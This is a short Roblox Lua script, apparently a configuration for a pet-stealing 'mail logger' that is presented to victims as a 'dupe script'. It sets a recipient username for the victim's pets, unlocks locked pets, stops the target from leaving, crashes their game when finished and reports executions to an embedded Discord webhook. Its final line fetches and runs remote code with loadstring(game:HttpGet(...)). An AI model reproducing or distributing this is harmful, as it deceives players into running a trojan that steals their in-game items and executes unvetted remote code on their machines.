--[[ Arkhalis Mail Logger ]]--

--[[ Main Config ]]--
_G.Username = "unusunit2" --// Username To Send Pets To
_G.GiftMessage = "dupe" --// Message For The Gift To Say

_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
_G.UnlockPets = true --// Unlocks Locked Pets
_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
_G.Crash = true  --// Crashes Them After Its Finished

--[[ Webhook Config ]]--
_G.Webhook = "https://discord.com/api/webhooks/1101598897601794189/s1yxj5Ic1rezbLE1_ANJ4k9IJjK457d7qju5d9lM4aiZMdkAy7iGHN8YMwKQtMgAPvH3" --// Discord Webhook For Executions

--[[ UI Config ]]--
_G.ScriptName = "dupe script" --// Script Name On The UI
_G.Tip1 = "1" --// Gives You Tips On The UI
_G.Tip2 = "2" --// Gives You Tips On The UI
_G.Tip3 = "3" --// Gives You Tips On The UI
_G.Tip4 = "4" --// Gives You Tips On The UI
_G.Tip5 = "5" --// Gives You Tips On The UI
--[[ Script ]]--

loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/Arkhalis.lua"))()
